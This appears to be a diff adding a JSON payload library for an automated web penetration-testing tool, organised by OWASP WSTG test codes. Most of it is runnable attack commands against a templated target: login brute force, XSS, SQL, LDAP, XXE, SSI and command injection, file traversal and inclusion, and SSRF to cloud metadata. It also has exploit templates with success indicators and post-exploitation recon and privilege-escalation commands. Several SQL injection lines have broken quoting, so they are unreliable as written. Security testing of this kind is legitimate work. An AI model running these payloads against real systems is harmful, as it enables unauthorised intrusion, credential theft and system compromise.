@@ -1,0 +1,339 @@
+{
+  "wstg_vectors": {
+    "WSTG-INFO-01": {
+      "name": "Conduct Search Engine Discovery Reconnaissance for Information Leakage",
+      "category": "Information Gathering",
+      "tools": ["google dorks", "shodan", "censys"],
+      "payloads": [
+        "site:{target} filetype:pdf",
+        "site:{target} inurl:admin",
+        "site:{target} intitle:index.of"
+      ],
+      "remediation": "Restrict indexing of sensitive directories via robots.txt and meta tags."
+    },
+    "WSTG-INFO-02": {
+      "name": "Fingerprint Web Server",
+      "category": "Information Gathering",
+      "tools": ["nmap", "curl", "whatweb"],
+      "payloads": [
+        "curl -s -I {target}",
+        "nmap -sV -p 80,443 {target}",
+        "whatweb {target}"
+      ],
+      "remediation": "Remove or obfuscate server version headers."
+    },
+    "WSTG-INFO-03": {
+      "name": "Review Webserver Metafiles for Information Leakage",
+      "category": "Information Gathering",
+      "tools": ["curl", "wget"],
+      "payloads": [
+        "curl -s {target}/robots.txt",
+        "curl -s {target}/.well-known/security.txt",
+        "curl -s {target}/sitemap.xml"
+      ],
+      "remediation": "Audit robots.txt and sitemap.xml for sensitive path disclosure."
+    },
+    "WSTG-INFO-04": {
+      "name": "Enumerate Applications on Web Server",
+      "category": "Information Gathering",
+      "tools": ["gobuster", "ffuf", "dirb"],
+      "payloads": [
+        "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 50",
+        "ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403"
+      ],
+      "remediation": "Disable directory listing and restrict access to admin panels."
+    },
+    "WSTG-INFO-08": {
+      "name": "Fingerprint Web Application Framework",
+      "category": "Information Gathering",
+      "tools": ["whatweb", "wappalyzer", "nuclei"],
+      "payloads": [
+        "whatweb -a 3 {target}",
+        "nuclei -u {target} -tags tech -silent"
+      ],
+      "remediation": "Remove framework-identifying headers and default files."
+    },
+    "WSTG-CONF-05": {
+      "name": "Enumerate Infrastructure and Application Admin Interfaces",
+      "category": "Configuration and Deployment",
+      "tools": ["gobuster", "ffuf"],
+      "payloads": [
+        "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 30",
+        "ffuf -u {target}/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301,302"
+      ],
+      "remediation": "Restrict admin panels to internal IPs. Use strong auth."
+    },
+    "WSTG-ATHN-01": {
+      "name": "Testing for Credentials Transported over an Encrypted Channel",
+      "category": "Authentication Testing",
+      "tools": ["curl", "sslscan", "testssl.sh"],
+      "payloads": [
+        "curl -s -I https://{target}",
+        "sslscan {target}",
+        "testssl.sh {target}"
+      ],
+      "remediation": "Enforce HTTPS everywhere with HSTS headers."
+    },
+    "WSTG-ATHN-03": {
+      "name": "Testing for Weak Lock Out Mechanism",
+      "category": "Authentication Testing",
+      "tools": ["hydra", "burpsuite"],
+      "payloads": [
+        "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f {target} http-post-form '/login:user=^USER^&pass=^PASS^:F=Invalid'"
+      ],
+      "remediation": "Implement account lockout after 5 failed attempts with exponential backoff."
+    },
+    "WSTG-INPV-01": {
+      "name": "Testing for Reflected Cross Site Scripting",
+      "category": "Input Validation Testing",
+      "tools": ["curl", "dalfox", "xsstrike"],
+      "payloads": [
+        "curl -s '{target}/search?q=<script>alert(1)</script>'",
+        "dalfox url '{target}/search?q=test' --skip-bav",
+        "curl -s '{target}/?id=<img src=x onerror=alert(1)>'"
+      ],
+      "remediation": "Implement input validation, output encoding, and Content-Security-Policy headers."
+    },
+    "WSTG-INPV-05": {
+      "name": "Testing for SQL Injection",
+      "category": "Input Validation Testing",
+      "tools": ["sqlmap", "curl"],
+      "payloads": [
+        "sqlmap -u '{target}/page?id=1' --batch --level=3 --risk=2 --dbs",
+        "curl -s '{target}/login' -d \"user=admin' OR '1'='1&pass=test\"",
+        "curl -s '{target}/page?id=1' AND SLEEP(5)--'"
+      ],
+      "remediation": "Use parameterized queries/prepared statements. Never concatenate user input into SQL."
+    },
+    "WSTG-INPV-06": {
+      "name": "Testing for LDAP Injection",
+      "category": "Input Validation Testing",
+      "tools": ["curl"],
+      "payloads": [
+        "curl -s '{target}/search?user=*)(uid=*))(|(uid=*'"
+      ],
+      "remediation": "Validate and escape special LDAP characters in user input."
+    },
+    "WSTG-INPV-07": {
+      "name": "Testing for XML Injection",
+      "category": "Input Validation Testing",
+      "tools": ["curl"],
+      "payloads": [
+        "curl -s -X POST '{target}/api' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'"
+      ],
+      "remediation": "Disable DTD processing and external entities in XML parsers."
+    },
+    "WSTG-INPV-08": {
+      "name": "Testing for SSI Injection",
+      "category": "Input Validation Testing",
+      "tools": ["curl"],
+      "payloads": [
+        "curl -s '{target}/page?name=<!--#exec cmd=\"id\"-->'"
+      ],
+      "remediation": "Disable SSI processing or validate all user input."
+    },
+    "WSTG-INPV-11": {
+      "name": "Testing for Code Injection",
+      "category": "Input Validation Testing",
+      "tools": ["curl"],
+      "payloads": [
+        "curl -s '{target}/eval?code=phpinfo()'",
+        "curl -s '{target}/exec?cmd=id'"
+      ],
+      "remediation": "Never pass user input to code evaluation functions."
+    },
+    "WSTG-INPV-12": {
+      "name": "Testing for Command Injection",
+      "category": "Input Validation Testing",
+      "tools": ["curl", "commix"],
+      "payloads": [
+        "curl -s '{target}/ping?ip=127.0.0.1;id'",
+        "curl -s '{target}/ping?ip=127.0.0.1|cat /etc/passwd'",
+        "commix --url='{target}/ping?ip=127.0.0.1' --batch"
+      ],
+      "remediation": "Use allow-lists for input. Avoid shell execution of user data."
+    },
+    "WSTG-INPV-17": {
+      "name": "Testing for HTTP Incoming Requests",
+      "category": "Input Validation Testing",
+      "tools": ["curl"],
+      "payloads": [
+        "curl -s '{target}/' -H 'X-Forwarded-For: 127.0.0.1'",
+        "curl -s '{target}/' -H 'X-Original-URL: /admin'"
+      ],
+      "remediation": "Do not trust client-supplied headers for access control."
+    },
+    "WSTG-ATHZ-01": {
+      "name": "Testing Directory Traversal / File Include",
+      "category": "Authorization Testing",
+      "tools": ["curl", "dotdotpwn"],
+      "payloads": [
+        "curl -s '{target}/page?file=../../../../etc/passwd'",
+        "curl -s '{target}/download?path=....//....//....//etc/passwd'",
+        "curl -s '{target}/include?page=php://filter/convert.base64-encode/resource=index'"
+      ],
+      "remediation": "Validate file paths. Use chroot or jail. Never use user input in file operations."
+    },
+    "WSTG-ATHZ-02": {
+      "name": "Testing for Bypassing Authorization Schema",
+      "category": "Authorization Testing",
+      "tools": ["curl"],
+      "payloads": [
+        "curl -s '{target}/admin' -H 'X-Forwarded-For: 127.0.0.1'",
+        "curl -s '{target}/api/users' -X GET"
+      ],
+      "remediation": "Implement server-side authorization checks on every request."
+    },
+    "WSTG-SESS-01": {
+      "name": "Testing for Session Management Schema",
+      "category": "Session Management Testing",
+      "tools": ["curl", "burpsuite"],
+      "payloads": [
+        "curl -s -v '{target}/login' 2>&1 | grep -i 'set-cookie'",
+        "curl -s '{target}/dashboard' -b 'session=tampered_value'"
+      ],
+      "remediation": "Use secure, HttpOnly, SameSite cookie flags. Regenerate sessions on auth."
+    },
+    "WSTG-ERRH-01": {
+      "name": "Testing for Improper Error Handling",
+      "category": "Error Handling",
+      "tools": ["curl"],
+      "payloads": [
+        "curl -s '{target}/nonexistent_page_12345'",
+        "curl -s '{target}/api/v1/' -X DELETE"
+      ],
+      "remediation": "Use generic error pages. Never expose stack traces or internal paths."
+    },
+    "WSTG-CRYP-01": {
+      "name": "Testing for Weak Transport Layer Security",
+      "category": "Cryptography",
+      "tools": ["sslscan", "testssl.sh", "nmap"],
+      "payloads": [
+        "sslscan {target}",
+        "nmap --script ssl-enum-ciphers -p 443 {target}"
+      ],
+      "remediation": "Disable SSLv3, TLS 1.0/1.1. Use TLS 1.2+ with strong cipher suites."
+    }
+  },
+  "exploit_templates": {
+    "path_traversal": {
+      "description": "Directory traversal to read sensitive files",
+      "wstg_code": "WSTG-ATHZ-01",
+      "template": "curl -s '{target}/{endpoint}?{param}=../../../../etc/passwd'",
+      "success_indicators": ["root:x:0:0", "/bin/bash", "/bin/sh"],
+      "severity": "High"
+    },
+    "sqli_time_based": {
+      "description": "Time-based blind SQL injection",
+      "wstg_code": "WSTG-INPV-05",
+      "template": "curl -s -o /dev/null -w '%{{time_total}}' '{target}/{endpoint}?{param}=1' AND SLEEP(5)--'",
+      "success_indicators": ["response time > 5 seconds"],
+      "severity": "Critical"
+    },
+    "sqli_error_based": {
+      "description": "Error-based SQL injection",
+      "wstg_code": "WSTG-INPV-05",
+      "template": "curl -s '{target}/{endpoint}?{param}=1' UNION SELECT NULL,NULL,NULL--'",
+      "success_indicators": ["SQL syntax", "mysql", "postgresql", "sqlite"],
+      "severity": "Critical"
+    },
+    "xss_reflected": {
+      "description": "Reflected Cross-Site Scripting",
+      "wstg_code": "WSTG-INPV-01",
+      "template": "curl -s '{target}/{endpoint}?{param}=<script>alert(document.domain)</script>'",
+      "success_indicators": ["<script>alert(", "document.domain"],
+      "severity": "Medium"
+    },
+    "command_injection": {
+      "description": "OS command injection via parameter",
+      "wstg_code": "WSTG-INPV-12",
+      "template": "curl -s '{target}/{endpoint}?{param}=127.0.0.1;id'",
+      "success_indicators": ["uid=", "gid=", "root"],
+      "severity": "Critical"
+    },
+    "xxe_injection": {
+      "description": "XML External Entity injection",
+      "wstg_code": "WSTG-INPV-07",
+      "template": "curl -s -X POST '{target}/{endpoint}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'",
+      "success_indicators": ["root:x:0:0"],
+      "severity": "Critical"
+    },
+    "ssrf_basic": {
+      "description": "Server-Side Request Forgery",
+      "wstg_code": "WSTG-INPV-17",
+      "template": "curl -s '{target}/{endpoint}?url=http://169.254.169.254/latest/meta-data/'",
+      "success_indicators": ["ami-id", "instance-id", "local-ipv4"],
+      "severity": "High"
+    },
+    "lfi_php_filter": {
+      "description": "Local File Include via PHP filter wrapper",
+      "wstg_code": "WSTG-ATHZ-01",
+      "template": "curl -s '{target}/{endpoint}?{param}=php://filter/convert.base64-encode/resource=index'",
+      "success_indicators": ["PD9waHA"],
+      "severity": "High"
+    },
+    "brute_force_login": {
+      "description": "HTTP login brute force",
+      "wstg_code": "WSTG-ATHN-03",
+      "template": "hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 4 -f {target} http-post-form '{login_path}:user=^USER^&pass=^PASS^:F={fail_string}'",
+      "success_indicators": ["login:", "password:", "host:"],
+      "severity": "High"
+    }
+  },
+  "enumeration_techniques": {
+    "directory_bruteforce": {
+      "description": "Discover hidden directories and files",
+      "tools": ["gobuster", "ffuf", "dirb"],
+      "command": "gobuster dir -u {target} -w /usr/share/wordlists/dirb/common.txt -t 50 -o /tmp/gobuster.txt"
+    },
+    "subdomain_enum": {
+      "description": "Enumerate subdomains",
+      "tools": ["subfinder", "amass"],
+      "command": "subfinder -d {domain} -silent"
+    },
+    "vhost_enum": {
+      "description": "Virtual host enumeration",
+      "tools": ["ffuf"],
+      "command": "ffuf -u {target} -H 'Host: FUZZ.{domain}' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -mc 200"
+    },
+    "nikto_scan": {
+      "description": "Web server vulnerability scanner",
+      "tools": ["nikto"],
+      "command": "nikto -h {target} -Tuning 1234567890abcde"
+    },
+    "ssl_audit": {
+      "description": "TLS/SSL configuration audit",
+      "tools": ["sslscan", "testssl.sh"],
+      "command": "sslscan {target}"
+    },
+    "nuclei_vulnscan": {
+      "description": "Template-based vulnerability scan",
+      "tools": ["nuclei"],
+      "command": "nuclei -u {target} -severity critical,high -silent"
+    }
+  },
+  "post_exploitation": {
+    "internal_recon": {
+      "description": "After gaining shell, discover internal network",
+      "commands": [
+        "id && whoami",
+        "cat /etc/passwd",
+        "ifconfig || ip addr",
+        "netstat -tlnp || ss -tlnp",
+        "find / -perm -4000 -type f 2>/dev/null",
+        "cat /etc/crontab",
+        "env"
+      ]
+    },
+    "privilege_escalation": {
+      "description": "Common privesc checks",
+      "commands": [
+        "sudo -l",
+        "find / -writable -type f 2>/dev/null | head -20",
+        "ls -la /etc/shadow",
+        "uname -a",
+        "cat /proc/version"
+      ]
+    }
+  }
+}
